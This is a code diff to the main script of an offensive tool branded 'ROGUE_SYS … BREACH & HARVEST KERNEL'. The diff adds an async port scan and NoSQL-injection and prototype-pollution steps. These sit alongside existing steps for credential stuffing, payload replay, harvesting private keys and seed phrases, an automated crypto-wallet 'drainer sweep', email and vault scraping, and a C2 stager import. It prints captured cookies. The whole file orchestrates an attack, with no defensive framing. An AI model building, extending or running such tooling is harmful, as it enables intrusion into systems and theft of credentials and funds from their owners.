@@ -4,9 +4,11 @@ import time
 import random
 from modules.loader import load_wordlist
 from modules.parser import parse_target_source
+from modules.scanner import run_port_scanner             # <--- New Recon Module
 from modules.engine import run_autonomous_engine
+from modules.no_sql_prototype import test_nosql_and_pollution # <--- New Exploitation Module
 from modules.replayer import replay_and_inject_payloads
-from modules.dumper import harvest_email_intelligence
+from modules.dumper import harvest_email_intelligence     # <--- Upgraded Vault/Email Dumper
 from modules.mail import send_breach_alert
 from modules.payloads import deploy_c2_stager
 from modules.keyharvester import harvest_private_keys
@@ -30,7 +32,7 @@ BANNER = f"""{MATRIX_GREEN}{BOLD}
  ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗██╔════╝ 
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ 
 {RESET}{NEON_BLUE}═════════════════════════════════════════════════════════════
-   [ROGUE_SYS // ADVANCED RED TEAM BREACH & HARVEST KERNEL V5.0]
+   [ROGUE_SYS // ADVANCED RED TEAM BREACH & HARVEST KERNEL V5.1]
 ═════════════════════════════════════════════════════════════{RESET}
 """
 
@@ -44,7 +46,7 @@ def cyber_print(text, delay=0.01, color=MATRIX_GREEN):
     sys.stdout.flush()
     sys.stdout.write("\033[1S")
 
-def main():
+async def async_main():
     sys.stdout.write("\033[2J\033[H")
     print(BANNER)
     
@@ -65,8 +67,8 @@ def main():
     # Clean block-tree structured output for target isolation
     print(f"\n{CYAN}[TARGET 1/1] → https://{target}{RESET}")
     print(f"       └── [STATUS] Target isolated and locked successfully.")
-    cyber_print(f"{YELLOW}[INIT] Loading offensive wordlist dictionaries...{RESET}", 0.005)
     
+    cyber_print(f"{YELLOW}[INIT] Loading offensive wordlist dictionaries...{RESET}", 0.005)
     try:
         passwords = load_wordlist("config/passwords.txt")
     except Exception as e:
@@ -75,28 +77,42 @@ def main():
 
     print(f"       └── [SUCCESS] Wordlist Secured : {len(passwords)} candidate vectors loaded.")
 
-    # Step 1: Real-time DOM Inspection & Security Header Audit
-    print(f"\n{CYAN}[RECON 2/2] → Executing DOM & Header Intelligence Scan{RESET}")
+    # Step 1: High-Speed Port Scanning & Service Profiling
+    print(f"\n{CYAN}[RECON 1/3] → Executing Asynchronous Port Profiler{RESET}")
     try:
-        asyncio.run(parse_target_source(target))
+        await run_port_scanner(target)
+    except Exception as e:
+        print(f"       └── [!] Notice during port scan: {e}")
+
+    # Step 2: Real-time DOM Inspection & Security Header Audit
+    print(f"\n{CYAN}[RECON 2/3] → Executing DOM & Header Intelligence Scan{RESET}")
+    try:
+        await parse_target_source(target)
     except Exception as e:
         print(f"       └── [!] Notice during DOM parse: {e}")
 
-    # Step 2: Launch Heavy Autonomous Engine (TCP Telemetry, Fuzzing, Surface Mapping, Credential Stuffing)
-    hits, duration = asyncio.run(run_autonomous_engine(target, passwords))
+    # Step 3: Launch Heavy Autonomous Engine (Stateful Differential Analysis & Credential Stuffing)
+    hits, duration = await run_autonomous_engine(target, passwords)
 
-    # Adaptive Pivot: If primary brute-force yields nothing, immediately trigger async replayer/injection
+    # Step 4: NoSQL Injection & Prototype Pollution Suite (If primary engine needs deep API mutation)
     if not hits:
-        cyber_print(f"{YELLOW}[*] Primary perimeter held. Pivoting to neural payload injection & replaying...{RESET}", 0.005)
-        asyncio.run(replay_and_inject_payloads(target))
+        cyber_print(f"{YELLOW}[*] Primary perimeter held. Deploying NoSQL & Prototype Pollution vectors...{RESET}", 0.005)
+        pollution_hits = await test_nosql_and_pollution(target)
+        if pollution_hits:
+            hits.extend(pollution_hits)
 
-    # Step 3: Post-Exploitation, Cryptographic Key Harvesting & Clean Structured Asset Auditing
+    # Adaptive Pivot: If zero hits, trigger neural payload replaying
+    if not hits:
+        cyber_print(f"{YELLOW}[*] Deploying adaptive neural payload replaying...{RESET}", 0.005)
+        await replay_and_inject_payloads(target)
+
+    # Step 5: Post-Exploitation, Vault Scraping, Crypto Wallet & Asset Auditing
     cyber_print(f"\n{MATRIX_GREEN}[+] Initiating post-exploitation asset harvesting & multi-chain audit...{RESET}", 0.005)
     
     # 1. Harvest Private Keys & Seed Phrases
     keys_found = harvest_private_keys(".")
     
-    # 2. Universal Multi-Asset Check & Automated Drainer Sweep (Matched to 5-value return tuple)
+    # 2. Universal Multi-Asset Check & Automated Drainer Sweep
     drain_results = []
     total_artifacts = len(keys_found)
     
@@ -133,11 +149,11 @@ def main():
         except Exception as e:
             print(f"       └── [!] Multi-chain asset audit error: {e}")
 
-    # 3. Dispatch Encrypted Email Intelligence & Alerts
+    # 3. Properly Awaited Email Intelligence, Vault Scraping & Alerts
     try:
-        harvest_email_intelligence(target)
-    except Exception:
-        pass
+        await harvest_email_intelligence(target, verified_hits=hits)
+    except Exception as e:
+        print(f"       └── [!] Intelligence harvest notice: {e}")
 
     for hit in hits:
         try:
@@ -158,12 +174,15 @@ def main():
     if hits:
         cyber_print(f"{BOLD}{BLINK}[+++] BREACH CONFIRMED: {len(hits)} authorization vectors successfully bypassed!{RESET}", 0.005)
         for idx, hit in enumerate(hits, 1):
-            cyber_print(f" ├── Vector [{idx}]: Port {hit.get('port')} | Type: {hit.get('type')}", 0.005)
-            cyber_print(f" │    User: {hit.get('user')} | Key: {hit.get('password')}{RESET}", 0.005)
+            cyber_print(f" ├── Vector [{idx}]: Endpoint {hit.get('endpoint')} | Type: {hit.get('type')}", 0.005)
+            cyber_print(f" │    Status: {hit.get('status')} | Cookies: {hit.get('cookies')[:30]}...{RESET}", 0.005)
     else:
         cyber_print(f"{YELLOW}[---] Adaptive engagement concluded. Harvest reports compiled in plaintext.{RESET}", 0.005)
     
     cyber_print(f"{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}\n", 0.003)
+
+def main():
+    asyncio.run(async_main())
 
 if __name__ == "__main__":
     main()
